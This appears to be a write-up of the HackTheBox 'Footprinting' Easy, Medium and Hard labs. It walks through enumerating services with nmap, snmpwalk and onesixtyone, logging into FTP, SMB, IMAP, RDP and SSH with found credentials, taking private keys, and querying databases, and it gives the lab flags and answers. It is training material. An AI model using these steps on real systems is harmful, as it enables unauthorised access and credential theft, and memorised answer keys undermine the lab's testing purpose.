# Footprinting Lab - Easy 
1. Enumerate the target machine using nmap:
```
$ sudo nmap -n --disable-arp-ping -Pn <ip>
...
PORT     STATE SERVICE
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 27.99 seconds
```
1. We are already given the following credentials `ceil:qwer1234`. Try to connect to the ftp server at port `21` with this credentials. But notice ftp via this port is jailed to an empty directory. Try ftp to port `2121` and bingo:
```
ftp 10.129.18.14 2121
Connected to 10.129.18.14.
220 ProFTPD Server (Ceil's FTP) [10.129.18.14]
Name (10.129.18.14:kali): ceil
331 Password required for ceil
Password:
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||45769|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
ftp> cd .ssh
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||39334|)
150 Opening ASCII mode data connection for file list
drwx------   2 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
226 Transfer complete
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||49498|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |***************************************************************************|  3381       13.04 KiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (5.99 KiB/s)
```
1. At local, use the private key obtained from the target and connect to it via ssh:
```
$ chmod 600 id_rsa
$ ssh -i id_rsa ceil@10.129.18.14
ceil@NIXEASY:~$ find / -name 'flag.txt' 2>/dev/null
/home/flag/flag.txt
ceil@NIXEASY:~$ cat /home/flag/flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

`Answer: HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`

# Footprinting Lab - Medium
1. Enumerate the target first using nmap:
```
$ sudo nmap -Pn --disable-arp-ping -n <ip>
PORT     STATE SERVICE
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```
2. First enumerate the NFS service:
- Show available shares: `$ showmount -e <ip>` -> found /Techsupport
- Mount the share and list files:
```
$ mkdir mnt/techsupport
$ sudo mount -t nfs <ip>:/Techsupport mnt/techsupport -o nolock
$ sudo ls -lah mnt/techsupport
```
-> Found this file with size > 0: `ticket4238791283782.txt`
- Cat the file and retrieve this content:
```
 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15
16    userpass {
17      withUserNameSupport=false
18      sendWelcomeEmail=true
19      enableGravatarSupport=true
20      signupSkipLogin=true
21      tokenDuration=60
22      tokenDeleteInterval=5
23      minimumPasswordLength=8
24      enableTokenJob=true
25      hasher=bcrypt
26      }
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }
```
3. With the found credentials `alex:lol123!mD`, get access to the SMB server:
- `# smbclient -L //<ip> -U "alex%lol123!mD"` -> found the `devshare` share
- Enumerate this share:
```
# smbclient -L //<ip>/devshare -U "alex%lol123!mD"
smb: \> ls
  .                                   D        0  Wed Nov 10 23:12:22 2021
  ..                                  D        0  Wed Nov 10 23:12:22 2021
  important.txt                       A       16  Wed Nov 10 23:12:55 2021

                6367231 blocks of size 4096. 2592865 blocks available
smb: \> get important.txt
getting file \important.txt of size 16 as important.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
- Read the file at host and found the credential for the SQL Server admin: 
```
$ cat important.txt
sa:87N1ns@slls83
```
4. Since RDP is enabled (base on the nmap result), try to connect to the target. Base on the hint: `We also need to keep in mind, that each Windows system has an Administrator account.`, use this credential to log in as the admin: `Administrator:87N1ns@slls83`
- `$ xfreerdp3 /u:Administrator /p:87N1ns@slls83 /v:<ip>`
- Once logged in, open the Microsoft SQL Server Management Studio, find the table `dbo.devsacc` inside the `accounts` database and query for the user's password:
    ```
    USE [accounts]
    GO

    SELECT [id]
        ,[name]
        ,[password]
    FROM [dbo].[devsacc]
    WHERE name='HTB'

    GO
    ```

`Answer: lnch7ehrdn43i7AoqVPK4zWR`

# Footprinting Lab - Hard
1. First perform a nmap scan (**also perform a UDP scan for full enumeration**):
```
$ sudo nmap -n -Pn --disable-arp-ping 10.129.169.58
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s

$ sudo nmap -sV --top-port 100 -sU 10.129.169.58
PORT     STATE         SERVICE VERSION
68/udp   open|filtered dhcpc
161/udp  open          snmp    net-snmp; net-snmp SNMPv3 server
1022/udp open|filtered exp2
```
2. Since connecting to both POP3/IMAP needs valid credentials, let's first enumerate the SNMP service:
   - Guessing community string: found `backup`
    ```
    $ onesixtyone -c ~/SecLists/Discovery/SNMP/snmp.txt 10.129.46.117
    Scanning 1 hosts, 3219 communities
    10.129.46.117 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
    ```
   - Use snmpwalk to query OIDs with their information: found `tom:NMds732Js2761"` 
    ```
    $ snmpwalk -v2c -c backup 10.129.46.117
    ...
    iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
    iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
    ...
    ```
3. With `tom:NMds732Js2761"` log in to the IMAP service:
```
$ openssl s_client -connect 10.129.46.117:imaps
Connecting to 10.129.46.117
...
1 LOGIN tom NMds732Js2761
1 OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
1 LIST "" *
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
1 OK List completed (0.010 + 0.000 + 0.009 secs).
1 SELECT INBOX
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 1 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 1636509064] UIDs valid
* OK [UIDNEXT 2] Predicted next UID
1 OK [READ-WRITE] Select completed (0.006 + 0.000 + 0.005 secs).
1 FETCH 1 all
* 1 FETCH (FLAGS (\Seen) INTERNALDATE "10-Nov-2021 01:44:26 +0000" RFC822.SIZE 3661 ENVELOPE ("Wed, 10 Nov 2010 14:21:26 +0200" "KEY" ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "MISSING_MAILBOX" "MISSING_DOMAIN")) ((NIL NIL "tom" "inlanefreight.htb")) NIL NIL NIL NIL))
1 OK Fetch completed (0.006 + 0.000 + 0.005 secs).
1 FETCH 1 BODY[TEXT]
* 1 FETCH (BODY[TEXT] {3430}
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
...
-----END OPENSSH PRIVATE KEY-----
)
1 OK Fetch completed (0.001 + 0.000 secs).
```
4. Save the SSH key to `id_rsa` and connect to the target using SSH:
```
$ sudo chmod 600 id_rsa
$ ssh -i id_rsa tom@<ip>
```
5. Enumerate the target:
   - `ls -la` -> found `.mysql_history` showing that the target has also MySQL service enabled
   - `cat .bash_history` -> found `mysql -u tom -p` showing the command to connect to MySQL
   - Use the found credentials `tom:NMds732Js2761` to connect to MySQL and find the password for `HTB`:
   ```
   mysql> show databases;
   +--------------------+
   | Database           |
   +--------------------+
   | information_schema |
   | mysql              |
   | performance_schema |
   | sys                |
   | users              |
   +--------------------+
   mysql> use users;
   mysql> show tables;
   +-----------------+
   | Tables_in_users |
   +-----------------+
   | users           |
   +-----------------+
   1 row in set (0.01 sec)

   mysql> show columns from users
       -> ;
   +----------+-------------+------+-----+---------+-------+
   | Field    | Type        | Null | Key | Default | Extra |
   +----------+-------------+------+-----+---------+-------+
   | id       | int         | YES  |     | NULL    |       |
   | username | varchar(50) | YES  |     | NULL    |       |
   | password | varchar(50) | YES  |     | NULL    |       |
   +----------+-------------+------+-----+---------+-------+
   3 rows in set (0.00 sec)

   mysql> select * from users where username = "HTB";
   +------+----------+------------------------------+
   | id   | username | password                     |
   +------+----------+------------------------------+
   |  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
   +------+----------+------------------------------+
   1 row in set (0.01 sec)
   ```

`Answer: cr3n4o7rzse7rzhnckhssncif7ds`